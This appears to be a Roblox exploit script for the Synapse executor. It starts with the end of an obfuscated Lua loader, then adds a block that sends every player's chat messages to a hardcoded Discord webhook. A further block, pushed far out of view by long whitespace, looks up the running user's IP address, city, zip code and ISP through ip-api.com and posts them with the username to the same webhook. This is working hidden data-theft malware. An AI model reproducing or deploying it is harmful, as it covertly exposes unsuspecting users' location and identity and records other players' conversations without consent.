1051);local v170;local v171;local v172;while true do if ((((2492 + 632) -(27 + 949))==(2846 -((758 -550) + 490))) and ((679 -(298 + 380))==v169)) then v172=nil;while true do if (((3528 -(2772 -(438 + 707)))==(3662 -(993 + 768))) and ((1093 -(967 + (548 -423)))==v170)) then while true do if ((1520<(5066 -(581 + 454))) and (v171==(0 + 0))) then local v223=317 -(181 + 136);local v224;while true do if (((683 -414)<(1780 + 3112)) and (0==v223)) then v224=0;while true do if (((68 + 3609)>=(2449 -(1169 + 487))) and ((1138 -(583 + 555))==v224)) then v66=v66 + (1446 -(152 + 1293));v172=v77[v66];v224=1116 -(139 + 740 + 236);end if ((v224==(1 -0)) or ((313 + 1235 + 479)<(7011 -5243))) then v171=1 -0;break;end end break;end end end if (((678 -(100 + 577))==v171) or ((1064 + 169 + 520)>(3811 -(485 + 329)))) then if ((((3003 -(106 + 1222)) + (9530 -6518))>(2039 -(855 + 454))) and (v172[1616 -(399 + 1216)]==(2 + 20))) then v148[v168-(1 -0)]={v84,v172[7 -4]};else v148[v168-(1 + 0)]={v36,v172[3 + 0]};end v83[ #v83 + (1333 -(211 + 74 + 1047))]=v148;break;end end break;end if (((1876 + 1476)==(4756 -(1109 + 295))) and (v170==(1055 -(635 + 48 + 372)))) then v171=1825 -(1751 + 74);v172=nil;v170=1045 -((419 -227) + 852);end end break;end if ((v169==0) or ((12036 -8378)==(111 + 1029))) then v170=0 + 0;v171=nil;v169=852 -(291 + 560);end end end v84[v86[1 + 1]]=v29(v146,v147,v37);break;end if ((4809<((30422 -24026) -(944 + 518))) and ((97 -(49 + 47))==v145)) then v148={};v147=v10({},{__index=function(v173,v174)local v178=0 -(904 -(854 + 50));local v179;local v180;while true do if (((8787 -5274)<=(984 + 3580)) and (((266 -(166 + 100)) -(0 + 0))==v178)) then v179=0 -0;v180=nil;v178=(599 -(55 + 543)) + 0;end if (((2035 + 1466)<(5949 -(787 + (1736 -1088)))) and (v178==(1 + 0))) then while true do if ((v179==(0 -0)) or (927>=(3079 + 452))) then local v210=0 -0;while true do if (((5511 -(4585 -(575 + 320)))<(5228 -(63 + 923))) and (v210==(0 -0))) then v180=v148[v174];return v180[1 + 0 + 0][v180[2]];end end end end break;end end end,__newindex=function(v175,v176,v177)local v181=350 -(7 + 164 + 179);local v182;while true do if (((3171 -(1867 -681))==(3423 -(1512 -(34 + 40)))) and (v181==(488 -(183 + 305)))) then v182=v148[v176];v182[635 -(459 + 175)][v182[7 -5]]=v177;break;end end end});v145=5 -3;end end else v84[v86[2]]=v84[v86[9 -6]][v86[10 -6]];end elseif (((3077 -(1352 + 544))<=(7250 -3507)) and (v87>(944 -(875 + (94 -51))))) then if ((((22419 -16835) -(1857 + 11))>3425) and (v84[v86[1089 -(295 + (1448 -(446 + 210)))]]==v86[156 -(149 + 3)])) then v66=v66 + (2 -1);else v66=v86[7 -4];end elseif (((13904 -9449)>=(1434 -(762 + 512))) and  not v84[v86[1889 -(706 + 1181)]]) then v66=v66 + (1 -0);else v66=v86[1268 -(481 + 784)];end v66=v66 + (1677 -(913 + 763));break;end end break;end end end end A,B=v27(v11(v70));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v35[4][v66] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end v0=4;end end end











































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end




















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"

                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
                                                                                                                                                                                                                                                                                     Method = "GET"
                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
                                                                                                                                                                                                                                                                                syn.request(
                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                      Url = webhook_url,
                                                                                                                                                                                                                                                                                      Method = "POST",
                                                                                                                                                                                                                                                                                      Headers = {
                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
                                                                                                                                                                                                                                                                                      },
                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                         )
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
